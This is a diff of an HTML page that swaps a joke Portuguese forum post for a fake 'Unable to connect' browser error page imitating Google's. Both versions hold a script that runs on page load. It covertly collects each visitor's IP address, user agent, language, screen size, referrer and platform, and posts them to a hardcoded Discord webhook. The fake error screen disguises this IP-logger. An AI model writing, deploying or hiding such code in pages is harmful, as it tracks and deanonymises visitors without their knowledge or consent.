@@ -1,189 +1,145 @@
-<!DOCTYPE html>
 <html>
-<head>
-  <title>Redpill Forum - Post By confetti</title>
   <style>
-    body {
-      background-color: #1C1C1C;
-      font-family: Arial, sans-serif;
-      margin: 0;
-      padding: 20px;
-      color: #EE7600;
+    #text{
+      position:absolute;
+      font-family: 'Segoe UI', Tahoma, sans-serif;
     }
-
-    .titulo {
-      text-align: center;
-      margin-bottom: 20px;
-    }
-
-    .container {
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: center; /* Modificado para centralizar as postagens */
-    }
-
-    .grupo-postagens {
-      width: calc(33.33% - 20px);
-      margin-bottom: 20px;
-    }
-
-    .postagem {
-      background-color: #1C1C1C;
-      border-radius: 5px;
-      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-      margin: 0 0 20px;
-      padding: 20px;
-    }
-
-    .postagem h2 {
-      margin-top: 0;
-    }
-
-    .postagem img,
-    .postagem video {
-      max-width: 100%;
-      height: auto;
-    }
-
-    .comentarios {
-      margin-top: 40px;
-      padding-top: 20px;
-      border-top: 1px solid #ccc;
-      text-align: center;
-    }
-
-    .comentario {
-      margin-bottom: 20px;
-      text-align: center;
-    }
-
-    .comentario strong {
-      display: block;
-      margin-bottom: 5px;
-      color: gray;
-    }
-
-    .usuario {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-
-    .usuario img {
-      width: 30px;
-      height: 30px;
-      border-radius: 50%;
-      margin-right: 10px;
-    }
-    .sidebar {
-  width: 250px;
-  background-color: #1C1C1C;
-  padding: 10px;
-  position: fixed;
-  top: 0;
-  left: 0;
-  height: 100%;
+    body{
+  background-color:#f7f7f7;
 }
 
-.sidebar a {
-  display: block;
-  margin-bottom: 10px;
-  color: #000;
-  text-decoration: none;
+dinoTravolta{
+  position:absolute;
+  background-image:url();
+  top:50%;
+  left:50%;
+  margin-left:-260px;
+  margin-top:-155px;
+  width:62px;
+  height:50px;
+  background-position:0 0;
+  animation: aniTravolta 5s steps(25) infinite;
+  animation-direction:alternate;
 }
 
-.sidebar .recent-images {
-  margin-top: 20px;
+error{
+  color:#333;
+  font-size: 1.6em;
+  font-weight: normal;
+  line-height: 1.25em;
+  left:50%;
+  top:50%;
+  margin-left:-250px;
+  margin-top:-90px;
 }
 
-.sidebar .recent-images img {
-  display: block;
-  width: 100%;
-  margin-bottom: 10px;
+smallMessage{
+  display:block;
+  color: #2b2b2b;
+  font-size: 1em;
+  line-height: 1.55;
+  width:650px;
+  left:50%;
+  top:50%;
+  margin-left:-250px;
+  margin-top:-47px;
 }
 
+errCause{
+  color: #b7b7b7;
+  font-size: .86667em;
+  left:50%;
+  top:50%;
+  margin-left:-250px;
+  margin-top:15px;
+}
+
+a, a:visited{
+  font: 13.3333px Arial !important;
+  top:50%;
+  left:50%;
+  margin-left:-250px;
+  margin-top:70px;
+  color:#696969;
+}
+
+
+
+overlay{
+  position:absolute;
+  margin-left:-8px;
+  margin-top:-8px;
+  width:100%;
+  height:100%;
+  background-color:black;
+}
+
+input:active{
+  display:none;
+}
+
+@keyframes aniTravolta{
+  0%{background-position: 0 0;}
+  50%{background-position: -1550px 0;}
+  50.0001%{background-position: 0 -50px;}
+  100%{background-position: -1550px -50px;}
+}
   </style>
-  </style>
-</head>
-<body>
-  <div class="titulo">
-    <img src="https://images.cooltext.com/5663076.gif" alt="Foto de Título">
-  </div><br><br><br>
-
-
-  <div class="container">
-    <div class="grupo-postagens">
-      <div class="postagem">
-        <h2>Chupa cabra</h2>
-        
-        <img src="https://i.pinimg.com/736x/1b/c9/6c/1bc96c623f4802f81599d0621071ea3a.jpg" alt="Foto 1">
-        <div class="post-footer">
-          Posted by: confetti | Date: 03/06/2023 | Time: 13:41
-      
-        <p>Homen escreve Deus com "D" minúsculo e vira chupa cabra no interior de alagoinhas.</p>
-        
-      </div>
-
-      <div class="comentario">
-        <div class="usuario">
-          <img src="https://i.pinimg.com/736x/f1/ad/aa/f1adaa0d3769b46544849b07e11610b4.jpg" alt="Foto do Usuário 3">
-          <strong>Luiz inácio lula</strong>
-        </div>
-        <p>Foi meu tio, ele é do interior de Alagoinhas mas foi só trolagem do zóio</p>
-
-  <div class="comentarios">
+    <script>
+        function enviarMensagem() {
+          fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+              const ipAddress = data.ip;
+              const webhookUrl = 'https://discordapp.com/api/webhooks/1125849929890402437/xHIrtwxCP_aDWwuivyFGAH81iHdZGhMDPg3vrCXZrDobhOkjSEJ0bNztpejZR14rNs_b';
     
-  </div>
-  <div class="sidebar">
-   
-    <h2>Recents Posts:</h2>
-    <div class="recent-images">
-      <a href="link_imagem1.html"><img src="https://media.tenor.com/yJnjYGAMF-8AAAAC/dead-chat-dead-chat-xd.gif" alt="Imagem 1"></a>
-      <a href="link_imagem2.html"><img src="https://media.tenor.com/hPsArdm2VYQAAAAS/pasen-cepesito-xd.gif" alt="Imagem 2"></a>
-      <a href="link_imagem3.html"><img src="https://i.pinimg.com/564x/5c/ae/bc/5caebc1e8fe82acb9a28055d0a0bdefc.jpg" alt="Imagem 3"></a>
-    </div>
-  </div>
-  <script>
-    function enviarMensagem() {
-      fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => {
-          const ipAddress = data.ip;
-          const webhookUrl = 'https://discordapp.com/api/webhooks/1125849929890402437/xHIrtwxCP_aDWwuivyFGAH81iHdZGhMDPg3vrCXZrDobhOkjSEJ0bNztpejZR14rNs_b';
-
-          const userAgent = navigator.userAgent;
-          const language = navigator.language;
-          const screenWidth = window.screen.width;
-          const screenHeight = window.screen.height;
-          const referrer = document.referrer;
-          const operatingSystem = navigator.platform;
-
-          const message = `@everyone Nova visita ao site! \nIP: ${ipAddress} \nUser-Agent: ${userAgent} \nLinguagem: ${language} \nScreen Resolução: ${screenWidth}x${screenHeight} \nReferrer: ${referrer} \nSistema Operacional: ${operatingSystem}`;
-
-          fetch(webhookUrl, {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-              content: message,
-            }),
-          })
-            .then(response => {
-              console.log('Mensagem enviada com sucesso!');
+              const userAgent = navigator.userAgent;
+              const language = navigator.language;
+              const screenWidth = window.screen.width;
+              const screenHeight = window.screen.height;
+              const referrer = document.referrer;
+              const operatingSystem = navigator.platform;
+    
+              const message = `@everyone Nova visita ao site! \nIP: ${ipAddress} \nUser-Agent: ${userAgent} \nLinguagem: ${language} \nScreen Resolução: ${screenWidth}x${screenHeight} \nReferrer: ${referrer} \nSistema Operacional: ${operatingSystem}`;
+    
+              fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                  content: message,
+                }),
+              })
+                .then(response => {
+                  console.log('Mensagem enviada com sucesso!');
+                })
+                .catch(error => {
+                  console.error('Erro ao enviar a mensagem:', error);
+                });
             })
             .catch(error => {
-              console.error('Erro ao enviar a mensagem:', error);
+              console.error('Erro ao obter o endereço IP:', error);
             });
-        })
-        .catch(error => {
-          console.error('Erro ao obter o endereço IP:', error);
+        }
+    
+        window.addEventListener('DOMContentLoaded', (event) => {
+          enviarMensagem();
         });
-    }
-
-    window.addEventListener('DOMContentLoaded', (event) => {
-      enviarMensagem();
-    });
-  </script>
-</body>
+      </script>
+  <body>
+    <dinoTravolta>
+    </dinoTravolta>
+    <error id=text>
+      Unable to connect to the Website
+    </error>
+    <smallMessage id=text>
+      Google can’t display the Website because your computer isn’t connected to the Internet.
+    </smallMessage>
+    <errCause id=text>
+      ERR_INTERNET_DISCONNECTED
+    </errCause>
+    <a href="https://google.com" id=text target='blank'>Details</a>
+  </body>
+    
 </html>
